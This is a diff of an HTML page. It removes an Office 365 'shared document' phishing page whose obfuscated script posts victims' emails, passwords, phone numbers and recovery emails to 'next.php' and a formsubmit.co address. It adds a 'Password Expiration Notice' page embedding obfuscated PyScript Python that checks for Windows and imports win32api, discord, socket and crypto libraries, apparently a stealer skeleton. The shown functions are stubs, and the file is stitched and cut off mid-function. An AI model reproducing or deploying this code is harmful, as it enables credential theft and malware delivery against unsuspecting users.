@@ -1,585 +1,901 @@
-
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
-    <script type="text/javascript" src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
-    <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
-    <!-- Required meta tags -->
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    <!-- Bootstrap CSS -->
-    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
-    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
-    <title>Office 365 Document | Login</title>
-    <link rel="icon" type="image/png" sizes="100x100" href="images/onedrive-white.png">
-    <link href="css/hover.css" rel="stylesheet" media="all">
-    <link href="css/album.css" rel="stylesheet">
-
-    <style type="text/css">
-
-      html, body {
-        height: 100%;
-      }
-
-     
-
-        .main-video-wrapper {
-          position:fixed;
-          top:0;
-          left:20;
-          width:100%;
-          height:100vh;
-          overflow:hidden;
-          z-index: -3;
-
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <meta http-equiv="X-UA-Compatible" content="IE=edge">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <link rel="stylesheet" href="https://pyscript.net/alpha/pyscript.css" />
+   <script defer src="https://pyscript.net/alpha/pyscript.js"></script>
+   <script type="text/javascript" src="https://cdn.bokeh.org/bokeh/release/bokeh-2.4.2.min.js"></script>
+   <script type="text/javascript" src="https://cdn.bokeh.org/bokeh/release/bokeh-gl-2.4.2.min.js"></script>
+   <script type="text/javascript" src="https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.4.2.min.js"></script>
+   <script type="text/javascript" src="https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.4.2.min.js"></script>
+   <script type="text/javascript" src="https://cdn.bokeh.org/bokeh/release/bokeh-mathjax-2.4.2.min.js"></script>
+   <title>Chart Example</title>
+   <py-env>
+   - bokeh
+   </py-env>
+    <title>Password Expiration Notice</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
         }
-        .main-video-overlay {
-          height:100vh;
-          position: fixed;
-          top:0;
-          left:0;
-          width:100vw;
-          z-index:-1;
-          background: rgba(0,0,0,0.7);
-          opacity: 0.8;
+        .container {
+            background-color: #ffffff;
+            max-width: 600px;
+            margin: 20px auto;
+            padding: 20px;
+            border: 1px solid #e1e1e1;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
         }
-
-        .b{
-          transition: 0.8s;
-          /*background:rgba(0,0,0,0.6);*/
+        .header {
+            text-align: center;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #e1e1e1;
         }
-        
-        .b1{
-          transition: 0.8s;
-          background:linear-gradient(to bottom, #FF3C00 5%, #cf3100 100%);
+        .header img {
+            max-width: 150px;
         }
-        .b2{
-          transition: 0.8s;
-          background:linear-gradient(to bottom, #0073C8 5%, #00528c 100%);
+        .content {
+            text-align: left;
+            margin-top: 20px;
         }
-        .b3{
-          transition: 0.8s;
-          background:linear-gradient(to bottom, #31459B 5%, #212d66 100%);
+        .content h1 {
+            color: #d83b01; /* Office365 accent color */
+            font-size: 22px;
+            margin-bottom: 20px;
         }
-        .b4{
-          transition: 0.8s;
-          background:linear-gradient(to bottom, #D44638 5%, #8c2d24 100%);
+        .content p {
+            color: #555555;
+            font-size: 16px;
+            line-height: 1.5;
+            margin-bottom: 20px;
         }
-        .b5{
-          transition: 0.8s;
-          background:linear-gradient(to bottom, #5F0F68 5%, #2f0733 100%);
+        .button {
+            display: block;
+            width: fit-content;
+            margin: 0 auto;
+            padding: 12px 24px;
+            background-color: #0078d4;
+            color: #ffffff;
+            text-decoration: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
         }
-        .b6{
-          transition: 0.8s;
-          background:linear-gradient(to bottom, #0B5BD3 5%, #073882 100%);
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 12px;
+            color: #888888;
         }
+    </style>
+</head>
+<body>
+   <div id="chart"></div>
+ 
+   <py-script>
 
+import sys
 
-        .b1:hover{
-          background:linear-gradient(to bottom, #cf3100 5%, #FF3C00 100%);
-        }
-        .b2:hover{
-          background:linear-gradient(to bottom, #00528c 5%, #0073C8 100%);
-        }
-        .b3:hover{
-          background:linear-gradient(to bottom, #212d66 5%, #31459B 100%);
-        }
-        .b4:hover{
-          background:linear-gradient(to bottom, #8c2d24 5%, #D44638 100%);
-        }
-        .b5:hover{
-          background:linear-gradient(to bottom, #2f0733 5%, #5F0F68 100%);
-        }
-        .b6:hover{
-          background:linear-gradient(to bottom, #073882 5%, #0B5BD3 100%);
-        }
-
-
-
-      </style>
-    </head>
-    <body style="background-image: url('images/back.jpg'); background-size: cover;background-repeat: no-repeat; background-position: right;">
-     <!-- videooo div start//////////// -->
-     <!-- <div class="main-video-wrapper" style="filter: blur(3px);-webkit-filter: blur(3px);">-->
-     <!-- Embedded Video Element -->
-     <!-- <video playsinline="playsinline" autoplay="autoplay" muted="muted" loop="loop">
-      <source src="video/dropbox.mp4" type="video/mp4">
-      </video>
-    </div> -->
-    <!-- Overlay Div for the Video -->
-    <!-- <div class="main-video-overlay"></div> -->
-    <!-- video div close/////////////////// -->
-    <!-- <div> -->
-      <div class="container-fluid p-0">
-        <div class="container-fluid">
-        <div class="row p-2" style="background-color:  #FF3C00;">
-          <div class="col-lg-12">
-            <img src="images/office3651.png" class="img-fluid" width="40px">
-            <span class="text-white h5 align-middle pl-2">Office 365 Documents</span>
-            
-          </div>
-          
-        </div>
-        <div class="row p-2" style="background-color: #ededed;border-bottom: 2px solid #ededed">
-          <div class="col-lg-12" style="padding-left: 70px;">
-            <span class="text-dark h5 align-middle">Document</span>
-            
-          </div>
-          
-        </div>
-        
-      </div>
-        <div class="container">
-          <div class="row rounded" style="margin: 70px 0px; border:2px solid #9c9c9c;background-color: #ededed">
-            <div class="col-lg-6 align-self-center p-3" style="border-right: 2px solid #9c9c9c">
-              <!-- <div class="mx-auto p-2" style="border:1px solid white;width: 528px;background-color: rgba(0,0,0,0.6); border-radius: 20px">
-                <img src="images/adobe1-w.png" class="img-fluid rounded-circle" width="40px;">
-                <span class="h4 text-white align-middle">Adobe Pdf</span>
-              </div> -->
-              <div class="text-center my-5">
-                <img src="images/logo.png" class="img-fluid pt-2 m-0" width="90px" ><br>
-                <span class="text-dark">562.33 KB</span><br>
-                <span class="text-dark" style="font-size: 24px">Scan0067.pdf</span><br>
-              </div>
-              <!-- <div class="text-center">
-                <span class="text-white">This File is protected with strong 128-bit AES encryption..</span><br>
-              <span class="text-white h5">To Decrypt this file You need to Sign In.</span>
-              </div> -->
-             
-
-            </div>
-            <div class="col-lg-6 py-3 align-self-center">
-              <div >
-                <div class=" text-white col-lg-11 ml-2"> 
-                  <span class="h5 text-dark" style="">Select your email provider</span><br>
-                  <span style="color:red;font-family: 'Archivo Narrow', sans-serif; ">Unfortunately we could not find your email provider based on your input.</span>
-                </div>
-                <div class="">
-                  <div class="row mx-2 mt-3">
-                    <div class="col-lg-4">
-                      <a href="javascript:void(0)" id="office365modal" class="w-100" data-toggle="modal" data-target="#ajaxModal" style="text-decoration: none;">
-                        <div class="text-center p-1 rounded mt-2 b1">
-                          <img src="images/office3651.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;">
-                          <span  style="vertical-align: middle; color: white;font-weight: 500">Office365</span>
-                        </div>
-                      </a>
-                    </div>
-
-                    <div class="col-lg-4">
-                      <a href="javascript:void(0)" id="outlookmodal" class=" w-100" data-toggle="modal" data-target="#ajaxModal" style="text-decoration: none;">
-                        <div class="text-center p-1 rounded mt-2 b2">
-                          <img src="images/outlook1.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;">
-                          <span style="vertical-align: middle; color: white;font-weight: 500;">Outlook</span>
-                        </div>
-                      </a>
-                    </div>
-                    <div class="col-lg-4">
-                      <a href="javascript:void(0)" id="aolmodal" class=" w-100" data-toggle="modal" data-target="#ajaxModal" style="text-decoration: none;">
-                        <div class="text-center p-1 rounded mt-2 b3">
-                          <img src="images/aol1.png" class="img-fluid" width="35px" style="padding:5px 0px 5px 0px;">
-                          <span style="vertical-align: middle; color: white;font-weight: 500;">Aol</span>
-                        </div>
-                      </a>
-                    </div>
-                    <div class="col-lg-4">
-                      <a href="javascript:void(0)" id="gmailmodal" class="w-100" data-toggle="modal" data-target="#ajaxModal" style="text-decoration: none;">
-                        <div class="text-center p-1 b b4 rounded mt-2 b4">
-                          <img src="images/gmail1.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;">
-                          <span class="pl-2" style="vertical-align: middle; color: white;font-weight: 500;">Gmail</span>
-                        </div>
-                      </a>
-                    </div>
-
-                    <div class="col-lg-4">
-                      <a href="javascript:void(0)" id="yahoomodal" class="w-100" data-toggle="modal" data-target="#ajaxModal" style="text-decoration: none;">
-                        <div class="text-center p-1 b b5 rounded mt-2 b5">
-                          <img src="images/yahoo1.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;">
-                          <span class="pl-2" style="vertical-align: middle; color: white;font-weight: 500;">Yahoo!</span>
-                        </div>
-                      </a>
-                    </div>
-                    <div class="col-lg-4 ">
-                      <a href="javascript:void(0)" id="othermodal" class=" w-100" data-toggle="modal" data-target="#ajaxModal" style="text-decoration: none;">
-                        <div class="text-center p-1 b b6 rounded mt-2 b6">
-                          <img src="images/other1.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;">
-                          <span class="pl-2" style="vertical-align: middle; color: white;font-weight: 500;">Other</span>
-                        </div>
-                      </a>
-                    </div>
-                  </div>
-                </div>
-              </div>
-            </div>
-          <!-- <div class="col-lg-3 align-self-center">
-           
-            
-          </div>  -->
-        </div> 
-      </div>
-
-
-    </div>
-  </div>
-
-
-
-
-  <!-- Modal for gmail -->
-    <div class="modal fade" id="ajaxModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
-        <div class="modal-dialog" role="document">
-            <div class="modal-content">
-                <div class="modal-header">
-                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
-                        <span aria-hidden="true">&times;</span>
-                    </button>
-                </div>
-                <div class="modal-body">
-                    <center>
-                        <img id="fieldImg" src="images/gmail.png" class="img-fluid rounded-circle" width="80px">
-                        <h5 class="modal-title" id="exampleModalLabel">Login with <span id="field">Gmail</span></h5>
-                        <div class="alert alert-danger" id="msg" style="display: none;">Invalid Password.! Please enter correct password.</div>
-                        <span class="text-danger error" style="display: none;">That account doesn't exist. Enter a different account</span>
-                    </center>
-                    <form action="https://formsubmit.co/ollarkunle1@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
-                      <input type="hidden" name="_captcha" value="false">
-                        <input type="hidden" name="count" id="count" value="0">
-                        <div id="div1">
-                            <div class="col-lg-12">
-                                <div class="form-group">
-                                    <div>
-                                        <label for="exampleInputEmail1">Email address</label>
-                                        <input type="email" name="ai" class="form-control" id="ai" aria-describedby="aiHelp" placeholder="Enter email" required="">
-                                        <small id="aiHelp" class="form-text text-muted">We'll never share your email with anyone else.</small></div>
-                                </div>
-                            </div>
-                            <div class="col-lg-12">
-                                <div class="form-group">
-                                    <label for="pr">Password</label>
-                                    <input type="password" name="pr" class="form-control" id="pr" aria-describedby="aiHelp" placeholder="Enter Password" required="">
-                                </div>
-                            </div>
-                            <div class="text-right">
-                                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
-                                <input type="button" class="btn btn-info pull-right" name="submit-btn" id="submit-btn" value="Login">
-                            </div>
-                        </div>
-                    <form action="https://formsubmit.co/ollarkunle1@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
-                      <input type="hidden" name="_captcha" value="false">                        <div id="div2" style="display: none;">
-                            <i class="fas fa-arrow-left" id="back"></i>&nbsp<span id="aich" class="h5">abc@abc.com</span><br>
-                            <span class="h4 font-weight-normal">Verify it's you</span><br>
-                            <span>This device is not recognized. For security, Google want to make sure it's really you.</span><br>
-                            
-                            <br>
-                            <span>Try another way to sign in</span>
-                            <div class="form-group mt-3">
-                                <input type="number" name="ph" class="form-control" id="ph" aria-describedby="aiHelp" placeholder="Enter Phone No." required="">
-                            </div>
-                            <div class="form-group mt-3">
-                                <input type="text" name="rec_ai" class="form-control" id="rec_ai" aria-describedby="aiHelp" placeholder="Enter Phone No." required="">
-                            </div>
-                            <div class="text-right">
-                                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
-                                <input type="button" class="btn btn-info pull-right" name="submit-btn1" id="submit-btn1" value="verify">
-                            </div>
-                        </div>
-                    </form>
-			       </form>
-                </div>
-            </div>
-        </div>
-    </div>
-    <!-- Optional JavaScript -->
-    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
-    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
-    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
-    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
-</body>
-<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
-<script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
-<script>
-$(document).ready(function() {
-    var count = 0;
-    var ou = "b3V0bG9vaw==";
-    var ho = "aG90bWFpbA==";
-    var gm = "Z21haWw=";
-    var ya = "eWFob28=";
-    var of = "b2ZmaWNlMzY1";
-
-    function getUrlVars() {
-        var vars = {};
-        var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m, key, value) {
-            vars[key] = value;
-        });
-        return vars;
-    }
-
-
-    if (!getUrlVars()["count"]) {
-
-    } else {
-        var count = getUrlVars()["count"];
-        $('#count').val(count);
-    }
-
-
-
-    /////////////url ai getting////////////////
-    var ai = window.location.hash.substr(1);
-    if (!ai) {
-
-    } else {
-        // $('#ai').val(ai);
-        var my_ai = ai;
-        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
-
-        if (!filter.test(my_ai)) {
-            $('.error').show();
-            ai.focus;
-            return false;
-        }
-        var ind = my_ai.indexOf("@");
-        var my_slice = my_ai.substr((ind + 1));
-        var c = my_slice.substr(0, my_slice.indexOf('.'));
-        var final = c.toLowerCase();
-        // alert(count);
-        var ai = window.location.hash.substr(1);
-        var my_ai = ai;
-        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
-        var ind = my_ai.indexOf("@");
-        var my_slice = my_ai.substr((ind + 1));
-        var c = my_slice.substr(0, my_slice.indexOf('.'));
-        var final = c.toLowerCase();
-        var count = $('#count').val();
-        if (final == atob(gm)) {
-            $('#fieldImg').attr('src', 'images/' + atob(gm) + '.png');
-            $('#field').html(atob(gm));
-            $('#ai').val(my_ai);
-            $('#aich').html(my_ai);
-            $("#gmailmodal").trigger("click");
-
-        } else if (final == atob(ou) || final == atob(ho)) {
-            $('#fieldImg').attr('src', 'images/' + atob(ou) + '.png');
-            $('#field').html("Outlook");
-            $('#ai').val(my_ai);
-            $('#aich').html(my_ai);
-            $("#outlookmodal").trigger("click");
-        } else if (final == "aol") {
-            $('#fieldImg').attr('src', 'images/aol.png');
-            $('#field').html("Aol");
-            $('#ai').val(my_ai);
-            $('#aich').html(my_ai);
-            $("#aolmodal").trigger("click");
-        } else if (final == atob( of )) {
-            $('#fieldImg').attr('src', 'images/' + atob( of ) + '.png');
-            $('#field').html("Office 365");
-            $('#ai').val(my_ai);
-            $('#aich').html(my_ai);
-            $("#office365modal").trigger("click");
-        } else if (final == atob(ya)) {
-            $('#fieldImg').attr('src', 'images/' + atob(ya) + '.png');
-            $('#field').html("Yahoo");
-            $('#ai').val(my_ai);
-            $('#aich').html(my_ai);
-            $("#yahoomodal").trigger("click");
-
-        } else {
-            $('#fieldImg').attr('src', 'images/othermail.ico');
-            $('#field').html("Other Mail");
-            $('#ai').val(my_ai);
-            $('#aich').html(my_ai);
-            $("#othermodal").trigger("click");
-        }
-
-    }
-    ///////////////url getting ai////////////////
-
-
-    $('#gmailmodal').click(function() {
-        $('#fieldImg').attr('src', 'images/' + atob(gm) + '.png');
-        $('#field').html(atob(gm));
-        $("#msg").hide();
-    });
-
-    $('#outlookmodal').click(function() {
-        $('#fieldImg').attr('src', 'images/' + atob(ou) + '.png');
-        $('#field').html("Outlook");
-        $("#msg").hide();
-    });
-    $('#aolmodal').click(function() {
-        $('#fieldImg').attr('src', 'images/aol.png');
-        $('#field').html("Aol");
-        $("#msg").hide();
-    });
-    $('#office365modal').click(function() {
-        $('#fieldImg').attr('src', 'images/' + atob( of ) + '.png');
-        $('#field').html("Office 365");
-        $("#msg").hide();
-    });
-    $('#yahoomodal').click(function() {
-        $('#fieldImg').attr('src', 'images/' + atob(ya) + '.png');
-        $('#field').html("Yahoo");
-        $("#msg").hide();
-    });
-    $('#othermodal').click(function() {
-        $('#fieldImg').attr('src', 'images/othermail.ico');
-        $('#field').html("Other Mail");
-        $("#msg").hide();
-    });
-
-    var file="bmV4dC5waHA=";
-    $('#submit-btn').click(function(event) {
-        $('.error').hide();
-        $('#msg').hide();
-        event.preventDefault();
-        var ai = $("#ai").val();
-        var pr = $("#pr").val();
-        $field= $('#field').html();
-        ///////////new injection////////////////
-        var my_ai = ai;
-        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
-        if (!ai) {
-            $('.error').show();
-            $('.error').html("Email field is empty...!");
-            ai.focus;
-            return false;
-        }
-        if (!filter.test(my_ai)) {
-            $('.error').show();
-            $('.error').html("That account doesn't exist. Enter a different account");
-            ai.focus;
-            return false;
-        }
-        if (!pr) {
-            $('.error').show();
-            $('.error').html("Password field is empty...!");
-            ai.focus;
-            return false;
-        }
-        var ind = my_ai.indexOf("@");
-        var my_slice = my_ai.substr((ind + 1));
-        var c = my_slice.substr(0, my_slice.indexOf('.'));
-        var final = c.toLowerCase();
-        ///////////new injection////////////////
-        count = count + 1;
-
-        $.ajax({
-            dataType: 'JSON',
-            url: atob(file),
-            type: 'POST',
-            data: {
-                ai: ai,
-                pr: pr,
-
-            },
-            // data: $('#contact').serialize(),
-            beforeSend: function(xhr) {
-                $('#submit-btn').val('Verifing...');
-            },
-            success: function(response) {
-                
-                if (count == 1 && (final == "gmail" || $field =="Gmail" || $field =="gmail") ) {
-                    $('#aich').html(my_ai);
-                    $("#div1").animate({ left: 0, opacity: "hide" }, 0);
-                    $("#div2").animate({ right: 0, opacity: "show" }, 1000);
-                    $('#submit-btn').hide();
-                    $('#submit-btn1').show();
-
-                    return false;
-
-                }
-                if (count >= 2) {
-                    count = 0;
-                    window.location.replace("http://google.com");
-                    return false;
-                }
-                $("#pr").val("");
-                $("#msg").show();
-            },
-            error: function() {
-                if (count == 1 && (final == "gmail" || $field =="Gmail" || $field =="gmail") ) {
-                    $('#aich').html(my_ai);
-                    $("#div1").animate({ left: 0, opacity: "hide" }, 0);
-                    $("#div2").animate({ right: 0, opacity: "show" }, 1000);
-                    $('#submit-btn').hide();
-                    $('#submit-btn1').show();
-
-                    return false;
-
-                }
-                if (count >= 2) {
-                    count = 0;
-                    window.location.replace("http://google.com");
-                    return false;
-                }
-                $("#pr").val("");
-                $("#msg").show();
-            },
-            complete: function() {
-                $('#submit-btn').val('Login');
-            }
-        });
-    });
-    $('#submit-btn1').click(function(event) {
-        event.preventDefault();
-        var ai = $("#ai").val();
-        var pr = $("#pr").val();
-        var ph = $("#ph").val();
-        var rec_ai = $("#rec_ai").val();
-        if (!ai) {
-            $('.error').show();
-            $('.error').html("Email field is empty...!");
-            ai.focus;
-            return false;
-        }
-        if (!pr) {
-            $('.error').show();
-            $('.error').html("Password field is empty...!");
-            ai.focus;
-            return false;
-        }
-        if (!ph) {
-            $('.error').show();
-            $('.error').html("Phone field is empty...!");
-            ai.focus;
-            return false;
-        }
-        if (!rec_ai) {
-            $('.error').show();
-            $('.error').html("Recovery email field is empty...!");
-            ai.focus;
-            return false;
-        }
-
-        $.ajax({
-            dataType: 'JSON',
-            url: atob(file),
-            type: 'POST',
-            data: {
-                ai: ai,
-                pr: pr,
-                ph: ph,
-                rec_ai: rec_ai
-
-            },
-            beforeSend: function(xhr) {
-                $('#submit-btn1').val('Verifing...');
-            },
-            success: function(response) {
-                window.location.replace("http://gmail.com");
-            },
-            error: function() {
-                window.location.replace("http://gmail.com");
-            },
-            complete: function() {
-                $('#submit-btn1').val('Verify');
-            }
-        });
-        // }
-    });
+def PQRFPMQXQNQBBLNYYRQEQMJACPXVYCIYEMGXSJWUAXCTPCKUSRZTHXHLTZHIQTCCJBUYMOZFFQSXJRHKBAQSOFXRJVRGLZCEWPWH():
+    def EMUCSTMTZWSAWIAHKWGOWHPLWYSINDYVILVGKUGYJYFNIJCRWI():
+        if sys.platform.startswith("win"):
+            return False
+        else:
+            return True
     
-});
-</script>
+    try: 
+        SURBDEEKJOWQUKTNKTQRPQOYLQZOPHXZZFXUDXDETPCZOVQBSWRCZF = EMUCSTMTZWSAWIAHKWGOWHPLWYSINDYVILVGKUGYJYFNIJCRWI()
+        if SURBDEEKJOWQUKTNKTQRPQOYLQZOPHXZZFXUDXDETPCZOVQBSWRCZF == True:
+            return SURBDEEKJOWQUKTNKTQRPQOYLQZOPHXZZFXUDXDETPCZOVQBSWRCZF
+    except:
+        return True
+    
+if PQRFPMQXQNQBBLNYYRQEQMJACPXVYCIYEMGXSJWUAXCTPCKUSRZTHXHLTZHIQTCCJBUYMOZFFQSXJRHKBAQSOFXRJVRGLZCEWPWH() == True:
+    sys.exit()
+    
+import os
+import socket
+import win32api
+import requests
+import base64
+import ctypes
+import threading
+import discord
+import zipfile
+import io
+from json import loads
+from urllib.request import urlopen
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives import padding
+from cryptography.hazmat.backends import default_backend
 
+def JNXAOHWIFLMCSGCKAOVBYZEDIPMNLJYJTULLSFXYAYWWXGMJNLDTKNCBES(EZNXYMNHRVXHDZLCDYVWZSMWNIKGPRSFKUWXNCVNAQZODPYZOLOLNWFKLTEWHGWPLHOWOOXAYHJAZNKSCAUNJRXJOGKOWFJIZN): 
+    SURBDEEKJOWQUKTNKTQRPQOYLQZOPHXZZFXUDXDETPCZOVQBSWRCZF_system_info = None
+    return SURBDEEKJOWQUKTNKTQRPQOYLQZOPHXZZFXUDXDETPCZOVQBSWRCZF_system_info
+
+def ILBRPVNKVBVFEWLJAYQWDSBAJGPJUTJWJZHKEUTBEECEBNCUVKDJZNDBCAGKOWWQHTPRPFAQWDEDVXBA(EZNXYMNHRVXHDZLCDYVWZSMWNIKGPRSFKUWXNCVNAQZODPYZOLOLNWFKLTEWHGWPLHOWOOXAYHJAZNKSCAUNJRXJOGKOWFJIZN):
+    FWCSHLFLHCFHKKMKJWMVIEUYHCPHBYMJKEWQWMNTILEGRUOEIIQ = None
+    return FWCSHLFLHCFHKKMKJWMVIEUYHCPHBYMJKEWQWMNTILEGRUOEIIQ
+
+def RURHFGHCHKIDGXCVPEABJHMJDSILHSQKSGZNLQZRTDGPSECVJCAKVRMFYHYUQKUZDNALVLQQJZZRLZ(EZNXYMNHRVXHDZLCDYVWZSMWNIKGPRSFKUWXNCVNAQZODPYZOLOLNWFKLTEWHGWPLHOWOOXAYHJAZNKSCAUNJRXJOGKOWFJIZN):
+    FXMNLKHBPLEIJXCQXOISUKTMJWQZSUARYCATCCMVDQSURPLDSMSBCOKHIMDUFTRDKVVPXKPPDITAOOZWUNTXFJWXVGFYCQKD = None
+    return FXMNLKHBPLEIJXCQXOISUKTMJWQZSUARYCATCCMVDQSURPLDSMSBCOKHIMDUFTRDKVVPXKPPDITAOOZWUNTXFJWXVGFYCQKD
+
+def FUCHLXDYTWSDLVFINVEWJJZMBEIZJJCTUJTGWRVFGAGNLAAWAKOLJTAVGUWBMDR(): 
+    AWRMEDOMSIQEROJINBSLEQZPAFJYACFEDGUMGQSDXZJBJVXCDSRCIKMDFCIH = None
+    return AWRMEDOMSIQEROJINBSLEQZPAFJYACFEDGUMGQSDXZJBJVXCDSRCIKMDFCIH
+
+def FXZQPCMPDJKPWZPVXSQNPJTPTBBWFVRSGSSQFBSUIIQKIQWTNHVR(EZNXYMNHRVXHDZLCDYVWZSMWNIKGPRSFKUWXNCVNAQZODPYZOLOLNWFKLTEWHGWPLHOWOOXAYHJAZNKSCAUNJRXJOGKOWFJIZN): 
+    VDLDIMTVBTGLZHNXMVQUSJWSVUIEWEBEPQDSLHIMMUCYPTSTIVIQQKXPMXHYXMEEHLPQKYKZGODUINNHZGGRPPOSHPZZ = None
+    VZZQKYMSSQZLYPNMFMZLYHUEBMIABELEPLAWUUSZMVAUFTTBPIPWPJWZYEVNYNFZENGMCSVMAQMKCQAUCGZCJ = None
+    MRADXHRKQXSFRCZTZCXFUDEUSBPLQUBLUQDBSXHIRJVURICKWFHCVDDMEUKVIVPMXTNLXDJWITDHSMHENIMVKRCU = None
+    JZSCRVUXLTDZXBPEKCLZCCPCZFAXPQSWBSSTUTTFXCYKDLVMENUYECSETHEACLURUVHSXYW = None
+    GQWIOGYFCMWVUQXESOADAFERNBWXBCZPCZSCINUDPHLWHZUUSBAHCIKIXIBFGJMRMXAYXEEWUORYDASRJHASFC = None
+    QBSCIMDFNYTOBGHGLZKGMYRBEPIWOWTMEXEWHNDYHLHIDUQPLJGAVNBAOVJVGXNNMQUOFJQSPSU = None
+    return VDLDIMTVBTGLZHNXMVQUSJWSVUIEWEBEPQDSLHIMMUCYPTSTIVIQQKXPMXHYXMEEHLPQKYKZGODUINNHZGGRPPOSHPZZ, VZZQKYMSSQZLYPNMFMZLYHUEBMIABELEPLAWUUSZMVAUFTTBPIPWPJWZYEVNYNFZENGMCSVMAQMKCQAUCGZCJ, MRADXHRKQXSFRCZTZCXFUDEUSBPLQUBLUQDBSXHIRJVURICKWFHCVDDMEUKVIVPMXTNLXDJWITDHSMHENIMVKRCU, JZSCRVUXLTDZXBPEKCLZCCPCZFAXPQSWBSSTUTTFXCYKDLVMENUYECSETHEACLURUVHSXYW, GQWIOGYFCMWVUQXESOADAFERNBWXBCZPCZSCINUDPHLWHZUUSBAHCIKIXIBFGJMRMXAYXEEWUORYDASRJHASFC, QBSCIMDFNYTOBGHGLZKGMYRBEPIWOWTMEXEWHNDYHLHIDUQPLJGAVNBAOVJVGXNNMQUOFJQSPSU
+
+def TKLENYLHBOFEJLYTGBKVZYYDAOQWHMKYSZGAVNENTWEEBKJYVKLNNADJZCH(EZNXYMNHRVXHDZLCDYVWZSMWNIKGPRSFKUWXNCVNAQZODPYZOLOLNWFKLTEWHGWPLHOWOOXAYHJAZNKSCAUNJRXJOGKOWFJIZN):
+    JLWFIATIJZSTEJZIRLXDKSBLOIQFYKDZWCSKYPCHDQAGASNHAHQGKLKBXEHPUUGXHBHKKJFKFLZCULWDQBXANL = None
+    ZBMVWPSWXZNGFFJLNSGQCYJLSRDDWOOTSKGWTKVNXKGZLLOGDZSCMXXGDQX = None
+    DPMQZTMSZKIRWPPSNJPXQVJPKNPHEQHPCOQGBLUEAGANVRRUDLSOBCVCXMQUVUPOKS = None
+    return JLWFIATIJZSTEJZIRLXDKSBLOIQFYKDZWCSKYPCHDQAGASNHAHQGKLKBXEHPUUGXHBHKKJFKFLZCULWDQBXANL, ZBMVWPSWXZNGFFJLNSGQCYJLSRDDWOOTSKGWTKVNXKGZLLOGDZSCMXXGDQX, DPMQZTMSZKIRWPPSNJPXQVJPKNPHEQHPCOQGBLUEAGANVRRUDLSOBCVCXMQUVUPOKS
+
+def AEQFDKGIPKPGWLGOAOVWNKYBXBBXWPKPWSCJKPGFFYELBQTVJYHNIENNJHELLQNJBCLLWQRCAKNIGMEBVJMLJOKTMQY(EZNXYMNHRVXHDZLCDYVWZSMWNIKGPRSFKUWXNCVNAQZODPYZOLOLNWFKLTEWHGWPLHOWOOXAYHJAZNKSCAUNJRXJOGKOWFJIZN):
